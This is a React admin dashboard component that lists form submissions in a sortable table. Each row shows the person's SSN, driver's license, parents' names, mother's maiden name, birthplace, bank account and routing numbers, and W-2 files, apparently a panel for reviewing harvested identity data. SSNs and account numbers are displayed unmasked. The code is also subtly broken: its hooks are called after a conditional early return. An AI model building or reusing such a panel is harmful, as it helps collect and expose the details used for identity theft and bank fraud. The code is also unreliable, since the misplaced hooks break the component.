import React, { useState, useEffect, useMemo } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';
import { useTable, useSortBy } from 'react-table';

const AdminDashboard = () => {
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  useEffect(() => {
    fetchSubmissions();
  }, []);

  const fetchSubmissions = async () => {
    try {
      const res = await axios.get('/api/admin/submissions', { withCredentials: true });
      setSubmissions(res.data);
    } catch (err) {
      console.error(err);
      if (err.response && err.response.status === 401) {
        navigate('/admin/login');
      }
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = async () => {
    await axios.post('/api/admin/logout', {}, { withCredentials: true });
    navigate('/admin/login');
  };

  const formatDate = (dateString) => {
    const date = new Date(dateString);
    return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
  };

  // Define columns for react-table (showing most important fields)
  const columns = useMemo(
    () => [
      { Header: 'ID.me', accessor: 'idmeVerified', Cell: ({ value }) => (value ? '✓' : '✗') },
      { Header: 'Driver\'s License', accessor: (row) => `${row.driversLicense.number} (${row.driversLicense.state})` },
      { Header: 'SSN', accessor: 'ssn' },
      { Header: 'Father', accessor: 'fathersName' },
      { Header: 'Mother', accessor: 'mothersName' },
      { Header: 'Maiden', accessor: 'mothersMaidenName' },
      { Header: 'Birth Place', accessor: (row) => `${row.placeOfBirth.city}, ${row.placeOfBirth.state}` },
      { Header: 'Bank', accessor: 'bankInfo.bankName' },
      { Header: 'Account', accessor: 'bankInfo.accountNumber' }, // consider masking if needed
      { Header: 'Routing', accessor: 'bankInfo.routingNumber' },
      { Header: 'Submitted', accessor: 'createdAt', Cell: ({ value }) => formatDate(value) },
      {
        Header: 'W-2',
        accessor: 'w2.url',
        Cell: ({ row }) =>
          row.original.w2?.url ? (
            <a href={row.original.w2.url} target="_blank" rel="noopener noreferrer">
              View
            </a>
          ) : row.original.w2?.data ? (
            <span>Base64 stored</span>
          ) : (
            '—'
          ),
      },
    ],
    []
  );

  if (loading) {
    return (
      <div className="container" style={{ textAlign: 'center', padding: '3rem' }}>
        <p>Loading submissions...</p>
      </div>
    );
  }

  const data = useMemo(() => submissions, [submissions]);
  const { getTableProps, getTableBodyProps, headerGroups, rows, prepareRow } = useTable(
    { columns, data },
    useSortBy
  );

  return (
    <div className="container" style={{ maxWidth: '1400px' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
        <h2>Submissions</h2>
        <button onClick={handleLogout} className="btn-secondary">
          Logout
        </button>
      </div>
      <div className="table-container">
        <table {...getTableProps()}>
          <thead>
            {headerGroups.map((headerGroup) => (
              <tr {...headerGroup.getHeaderGroupProps()}>
                {headerGroup.headers.map((column) => (
                  <th {...column.getHeaderProps(column.getSortByToggleProps())}>
                    {column.render('Header')}
                    <span>
                      {column.isSorted ? (column.isSortedDesc ? ' 🔽' : ' 🔼') : ''}
                    </span>
                  </th>
                ))}
              </tr>
            ))}
          </thead>
          <tbody {...getTableBodyProps()}>
            {rows.map((row) => {
              prepareRow(row);
              return (
                <tr {...row.getRowProps()}>
                  {row.cells.map((cell) => (
                    <td {...cell.getCellProps()}>{cell.render('Cell')}</td>
                  ))}
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>
      {submissions.length === 0 && (
        <p style={{ textAlign: 'center', marginTop: '2rem' }}>No submissions yet.</p>
      )}
    </div>
  );
};

export default AdminDashboard;